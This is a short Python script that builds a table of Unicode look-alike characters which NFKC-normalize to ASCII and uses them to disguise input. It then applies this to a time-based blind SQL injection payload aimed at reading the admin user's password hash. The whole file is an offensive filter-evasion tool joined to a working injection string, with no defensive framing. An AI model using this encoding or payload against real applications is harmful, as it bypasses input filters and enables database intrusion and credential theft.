import unicodedata
import random
import string

replacements = {}

def find_replacements(max):
    for original_c in string.printable:
        for code in range(0, max):
            char = chr(code)
            normalized = unicodedata.normalize('NFKC', char)

            if normalized == original_c and char != original_c:
                replacements[original_c] = replacements.get(original_c) + [char] if replacements.get(original_c) else [char]


def encoding(input_string):
    input_string = input_string.lower()

    for c in input_string:
        char_replacements = replacements.get(c)
        if char_replacements:
            replacement = random.choice(char_replacements)
            input_string = input_string.replace(c, replacement)

    return input_string


# maximum for unnicode is 0x110000
max = 0xFFFFF
find_replacements(max)

print(encoding("1 and (select sleep({treshold}) from user where username = 'admin' and hex(password) like '%')"))
